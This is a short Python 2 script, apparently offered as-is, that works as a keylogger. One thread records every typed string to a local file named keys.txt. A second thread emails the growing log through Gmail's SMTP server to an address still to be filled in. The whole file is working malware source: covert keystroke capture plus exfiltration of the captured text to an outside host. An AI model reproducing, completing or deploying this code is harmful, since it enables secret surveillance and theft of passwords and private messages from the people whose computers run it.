
#!/bin/usr/python
# -*- coding: utf-8 -*-

import threading
import os
import keyboard
import smtplib
from time import sleep
def keylogger():
    while True:
        FILE_NAME = "keys.txt"
        CLEAR_ON_STARTUP = False
        TERMINATE_KEY = "enter"
        if CLEAR_ON_STARTUP:
            os.remove(FILE_NAME)
        output = open(FILE_NAME, "a")
        for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
            #print string
            output.write(string+"\n")
        output.close()
def sendmail():
    CLEAR_ON_FINISH = False
    FILE_NAME = "keys.txt"
    t1=os.path.getmtime(FILE_NAME)
    while True:
        sleep(7.0)
        t2=os.path.getmtime(FILE_NAME)
        if t2<=t1:
            continue
        t1=t2
        gmail_user = ""
        gmail_password = ""
        FROM =gmail_user
        TO = ""
        SUBJECT= "key"    
        try:
            F = open(FILE_NAME,"r")
            TEXT= F.read()
            message = """\From: %s
To: %s
Subject: %s

%s
        """ % (FROM, TO, SUBJECT, TEXT)
        except:
            print "error"
        try: 
            server =smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()
            server.starttls()
            server.login(gmail_user,gmail_password)
            server.sendmail(FROM, TO, message)
            server.close()
            print "eviado"
        except:
            print "error"
        if CLEAR_ON_FINISH:
            os.remove(FILE_NAME)
#os.system("nano keys.txt")
while True:
    if __name__ == "__main__":
        key = threading.Thread(target=keylogger)
        mail = threading.Thread(target=sendmail)
        key.start()
        mail.start()
        key.join()
        mail.join()
 
